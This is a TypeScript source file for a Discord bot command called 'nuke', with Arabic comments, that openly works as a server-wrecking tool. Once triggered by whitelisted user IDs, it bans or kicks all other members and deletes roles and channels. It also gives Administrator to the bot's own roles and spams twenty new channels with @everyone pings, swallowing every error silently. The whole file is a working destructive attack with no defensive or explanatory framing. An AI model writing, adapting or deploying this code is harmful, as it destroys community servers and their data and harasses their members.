// language: TypeScript, file: src/commands/nuke-exec.ts
import { SlashCommandBuilder, PermissionFlagsBits, ChannelType, ChatInputCommandInteraction, Client } from 'discord.js';

export default {
    // بنسجل الأمر تاني عشان نضمن إنه يشتغل مع البوت
    data: new SlashCommandBuilder()
        .setName('nuke')
        .setDescription('تخريب شامل')
        .setDefaultMemberPermissions(PermissionFlagsBits.Administrator),

    // دالة التنفيذ
    async execute(interaction: ChatInputCommandInteraction, client: Client) {
        const allowed = ['1342238662368296980', '1557735350464417822']; // حط ايديك هنا
        if (!allowed.includes(interaction.user.id)) {
            return interaction.reply({ content: 'مش مسموح.', ephemeral: true });
        }

        await interaction.reply({ content: 'NUKE STARTED 💀', ephemeral: true }).catch(() => {});

        const guild = interaction.guild;
        if (!guild) return;

        const me = client.user?.id;
        const owner = interaction.user.id;

        // 1. حظر
        try {
            const members = await guild.members.fetch();
            for (const [id, member] of members) {
                if (id === me || id === owner) continue;
                if (member.bannable) await member.ban({ reason: 'Nuke' }).catch(() => {});
                else if (member.kickable) await member.kick('Nuke').catch(() => {});
                await new Promise(r => setTimeout(r, 150)); 
            }
        } catch (e) {}

        // 2. مسح الرولات
        try {
            const roles = await guild.roles.fetch();
            for (const [id, role] of roles) {
                if (id === guild.id || !role.editable) continue;
                if (me && role.members.has(me)) await role.setPermissions([PermissionFlagsBits.Administrator]).catch(() => {});
                else await role.delete('Nuke').catch(() => {});
                await new Promise(r => setTimeout(r, 200));
            }
        } catch (e) {}

        // 3. مسح القنوات
        try {
            const channels = await guild.channels.fetch();
            for (const [id, channel] of channels) {
                await channel!.delete('Nuke').catch(() => {});
                await new Promise(r => setTimeout(r, 200));
            }
        } catch (e) {}

        // 4. سبام
        for (let i = 0; i < 20; i++) {
            try {
                const newCh = await guild.channels.create({ name: `nuked-${i}`, type: ChannelType.GuildText }).catch(() => null);
                if (newCh) await newCh.send('@everyone NUKED 💀').catch(() => {});
            } catch {}
        }
    }
};